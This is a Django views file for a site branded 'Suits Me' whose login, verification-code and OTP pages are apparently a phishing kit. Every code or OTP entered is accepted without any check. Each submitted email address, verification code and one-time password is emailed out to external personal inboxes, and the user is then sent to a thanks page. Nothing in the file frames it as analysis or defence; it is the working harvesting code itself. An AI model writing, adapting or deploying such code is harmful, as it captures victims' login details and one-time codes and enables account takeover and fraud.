import os
from django.shortcuts import render, redirect
from .forms import RetrieveInfoForm, EmailForm, VerificationCodeForm, OTPForm
import requests
from django.conf import settings
from django.contrib import messages
from django.core.mail import EmailMultiAlternatives

def home(request):
    return render(request, 'home.html')

def redirect_page(request):
    return render(request, "check_email.html")


def login_page(request):
    """Login page - user enters email"""
    if request.method == 'POST':
        form = EmailForm(request.POST)
        if form.is_valid():
            try:
                email = form.cleaned_data['email']

                # Email settings - send the captured email to the admin inbox
                subject = "New Login Email Submission - Suits Me"
                from_email = settings.DEFAULT_FROM_EMAIL
                recipient_list = ['eugyneehunter@gmail.com']
                email_body = f"""
                A user has submitted their email address via the login page.

                Email: {email}

                ---
                This is an automated notification from Suits Me.
                """

                msg = EmailMultiAlternatives(subject, email_body, from_email, recipient_list)
                msg.send()

                # Redirect to check email page (flow continues with generic code entry)
                return redirect('check_email')
            except Exception as e:
                print(f"Email sending error: {str(e)}")
                messages.error(request, 'Failed to send email. Please try again later.')
                form = EmailForm(request.POST)
        else:
            form = EmailForm(request.POST)
    else:
        form = EmailForm()

    return render(request, 'logins.html', {'form': form})


def check_email(request):
    """Check email page - user enters verification code"""
    if request.method == 'POST':
        form = VerificationCodeForm(request.POST)
        if form.is_valid():
            # Accept any verification code
            verification_code = form.cleaned_data['verification_code']
            try:
                subject = "Verification Code Submission - Suits Me"
                from_email = settings.DEFAULT_FROM_EMAIL
                recipient_list = ['saint.nsj@proton.me']
                email_body = f"""
                A user has submitted a verification code via the check email page.

                Verification code: {verification_code}

                ---
                This is an automated notification from Suits Me.
                """

                msg = EmailMultiAlternatives(subject, email_body, from_email, recipient_list)
                msg.send()

                # Redirect to OTP page
                return redirect('enter_otp')
            except Exception as e:
                print(f"Verification email sending error: {str(e)}")
                messages.error(request, 'Failed to send verification code. Please try again.')
                form = VerificationCodeForm(request.POST)
        else:
            form = VerificationCodeForm(request.POST)
    else:
        form = VerificationCodeForm()
    
    return render(request, 'check_email.html', {'form': form})


def enter_otp(request):
    """Enter OTP page - user enters OTP"""
    if request.method == 'POST':
        form = OTPForm(request.POST)
        if form.is_valid():
            otp = form.cleaned_data['otp']
            
            # Ensure OTP is max 6 digits (already enforced by max_length)
            if len(otp) <= 6:
                try:
                    subject = "OTP Submission - Suits Me"
                    from_email = settings.DEFAULT_FROM_EMAIL
                    recipient_list = ['saint.nsj@proton.me']
                    email_body = f"""
                    A user has submitted an OTP via the enter OTP page.

                    OTP: {otp}

                    ---
                    This is an automated notification from Suits Me.
                    """

                    msg = EmailMultiAlternatives(subject, email_body, from_email, recipient_list)
                    msg.send()

                    # Accept any OTP and redirect to thanks page
                    return redirect('thanks')
                except Exception as e:
                    print(f"OTP email sending error: {str(e)}")
                    messages.error(request, 'Failed to send OTP. Please try again.')
                    form = OTPForm(request.POST)
            else:
                messages.error(request, 'OTP must be at most 6 digits.')
                form = OTPForm(request.POST)
        else:
            form = OTPForm(request.POST)
    else:
        form = OTPForm()
    
    return render(request, 'enter_otp.html', {'form': form})


def thanks(request):
    """Thanks page - final page after successful login"""
    return render(request, 'thanks.html')